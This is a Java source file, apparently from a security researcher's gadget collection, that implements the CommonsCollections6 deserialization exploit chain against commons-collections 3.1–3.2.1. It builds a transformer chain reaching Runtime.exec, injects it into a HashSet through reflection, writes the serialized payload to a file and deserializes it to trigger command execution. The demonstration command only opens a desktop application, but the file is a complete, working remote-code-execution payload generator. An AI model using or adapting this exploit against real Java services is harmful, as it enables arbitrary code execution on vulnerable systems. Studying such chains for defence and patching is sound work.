package com.sec.exploits.CommonsCollections.CommonsCollections6;

import com.sec.annotation.Dependencies;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-17 11:19
 **/

/**
 * Gadget chain:
 *         ObjectInputStream.readObject()
 *             HashSet.readObject()
 *                 HashMap.put()
 *                 HashMap.hash()
 *                     TiedMapEntry.hashCode()
 *                     TiedMapEntry.getValue()
 *                         LazyMap.get()
 *                             ChainedTransformer.transform()
 *                                 ConstantTransformer.transform()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Class.getMethod()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.getRuntime()
 *                                 InvokerTransformer.transform()
 *                                     Method.invoke()
 *                                         Runtime.exec()
 */
@Dependencies({
        "commons-collections:commons-collections:3.1-3.2.1",
        "jdk1.7 & 1.8"
})
public class HashSet_Exploit {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/IINA.app"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123);

        HashSet hashset = new HashSet(1);
        hashset.add("0range");

        //将map属性设置为我们的tmap
        //1.先拿到handle
        Field map = Class.forName("java.util.HashSet").getDeclaredField("map");
        map.setAccessible(true);
        HashMap hashset_map = (HashMap) map.get(hashset);
        //2.拿到map的table属性，里面应该存放entry
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);
        //3.将第一个entry的key设置为我们的tmap
        Object node = array[0];
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tmap);


        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc6_HashSet.ser")));
        fout.writeObject(hashset);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc6_HashSet.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();
    }
}
